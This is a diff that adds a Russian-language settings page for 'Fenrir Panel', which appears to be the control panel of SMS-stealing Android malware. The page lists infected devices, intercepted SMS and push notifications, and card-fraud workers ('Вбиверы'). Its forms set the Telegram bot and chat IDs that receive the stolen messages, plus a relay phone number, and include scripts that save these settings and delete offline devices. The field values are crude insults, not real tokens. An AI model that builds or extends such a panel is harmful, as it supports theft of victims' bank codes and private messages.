@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Настройки - Fenrir Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="preloader" id="preloader">
+        <div class="loader-spinner"></div>
+    </div>
+
+    <div class="app-container">
+        <!-- Mobile Menu Button -->
+        <button class="mobile-menu-btn" id="mobileMenuBtn">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <line x1="3" y1="6" x2="21" y2="6"></line>
+                <line x1="3" y1="12" x2="21" y2="12"></line>
+                <line x1="3" y1="18" x2="21" y2="18"></line>
+            </svg>
+        </button>
+        
+        <!-- Mobile Overlay -->
+        <div class="mobile-overlay" id="mobileOverlay"></div>
+        
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">
+                    <span class="logo-text">FENRIR</span>
+                </div>
+            </div>
+
+            <nav class="sidebar-nav">
+                <a href="/dashboard" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="3" width="7" height="7"></rect>
+                        <rect x="14" y="3" width="7" height="7"></rect>
+                        <rect x="14" y="14" width="7" height="7"></rect>
+                        <rect x="3" y="14" width="7" height="7"></rect>
+                    </svg>
+                    <span>Главная</span>
+                </a>
+
+                <a href="/devices" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                        <line x1="12" y1="18" x2="12.01" y2="18"></line>
+                    </svg>
+                    <span>Устройства</span>
+                </a>
+
+                <a href="/sms" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+                    </svg>
+                    <span>SMS</span>
+                </a>
+
+                <a href="/pushes" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                        <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+                    </svg>
+                    <span>Пуши</span>
+                </a>
+
+                
+                <div class="nav-divider"></div>
+                <span class="nav-label">Админ</span>
+
+                <a href="/workers" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="9" cy="7" r="4"></circle>
+                        <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
+                        <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                    </svg>
+                    <span>Вбиверы</span>
+                </a>
+
+                <a href="/settings" class="nav-item active">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="3"></circle>
+                        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
+                    </svg>
+                    <span>Настройки</span>
+                </a>
+
+                
+            </nav>
+
+            <div class="sidebar-footer">
+                <div class="user-info">
+                    <div class="user-avatar">
+                        S
+                    </div>
+                    <div class="user-details">
+                        <span class="user-name">spidey</span>
+                        <span class="user-role">Админ</span>
+                    </div>
+                </div>
+                <a href="/logout" class="logout-btn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
+                        <polyline points="16 17 21 12 16 7"></polyline>
+                        <line x1="21" y1="12" x2="9" y2="12"></line>
+                    </svg>
+                </a>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            
+<div class="page-header">
+    <h1>Настройки</h1>
+    <p>Конфигурация панели</p>
+</div>
+
+<div class="settings-grid">
+    <div class="settings-section">
+        <h3>Настройки Telegram бота</h3>
+        <form id="telegramForm">
+            <div class="form-group">
+                <label>Токен бота</label>
+                <input type="text" id="botToken" value="@ZLOYPIDOR777-SPIDEY" placeholder="Введите токен бота...">
+            </div>
+            <div class="form-group">
+                <label>Chat ID админа</label>
+                <input type="text" id="adminChatId" value="DOLBAEB" placeholder="Введите chat ID админа...">
+            </div>
+            <div class="form-group">
+                <label>Chat ID для SMS</label>
+                <input type="text" id="smsChatId" value="-DOLBAEB" placeholder="Введите chat ID для SMS...">
+            </div>
+            <div class="form-group">
+                <label>Chat ID для пушей</label>
+                <input type="text" id="pushChatId" value="-DOLBAEB" placeholder="Введите chat ID для пушей...">
+            </div>
+            <button type="submit" class="btn btn-primary">Сохранить настройки</button>
+        </form>
+    </div>
+
+    <div class="settings-section">
+        <h3>SMS Ретрансляция</h3>
+        <p class="section-desc">Номер телефона, на который будут отправляться SMS с device ID при регистрации устройства</p>
+        <form id="retryForm">
+            <div class="form-group">
+                <label>Номер для ретрансляции</label>
+                <input type="text" id="retryPhone" value="SEKSSSSS" placeholder="+79001234567">
+            </div>
+            <button type="submit" class="btn btn-primary">Сохранить номер</button>
+        </form>
+    </div>
+
+    <div class="settings-section">
+        <h3>Опасная зона</h3>
+        <div class="danger-actions">
+            <div class="danger-item">
+                <div class="danger-info">
+                    <span class="danger-title">Удалить офлайн устройства</span>
+                    <span class="danger-desc">Удалить все устройства которые были офлайн более 2 дней</span>
+                </div>
+                <button class="btn btn-danger" id="deleteOfflineBtn">Удалить</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+        </main>
+    </div>
+
+    <script src="index.js"></script>
+    
+<script>
+document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const data = {
+        bot_token: document.getElementById('botToken').value,
+        admin_chat_id: document.getElementById('adminChatId').value,
+        sms_chat_id: document.getElementById('smsChatId').value,
+        push_chat_id: document.getElementById('pushChatId').value
+    };
+    
+    try {
+        const response = await fetch('/api/telegram_settings', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        
+        if (response.ok) {
+            alert('Настройки сохранены');
+        } else {
+            alert('Ошибка сохранения настроек');
+        }
+    } catch (e) {
+        alert('Ошибка сохранения настроек');
+    }
+});
+
+document.getElementById('deleteOfflineBtn').addEventListener('click', async function() {
+    if (!confirm('Вы уверены что хотите удалить все офлайн устройства?')) return;
+    
+    try {
+        const response = await fetch('/api/delete_offline_devices', { method: 'DELETE' });
+        const data = await response.json();
+        alert(data.message);
+    } catch (e) {
+        alert('Ошибка удаления устройств');
+    }
+});
+
+document.getElementById('retryForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const data = {
+        retry_phone: document.getElementById('retryPhone').value
+    };
+    
+    try {
+        const response = await fetch('/api/retry_phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        
+        if (response.ok) {
+            alert('Номер для ретрансляции сохранён');
+        } else {
+            alert('Ошибка сохранения');
+        }
+    } catch (e) {
+        alert('Ошибка сохранения');
+    }
+});
+</script>
+
+</body>
+</html>
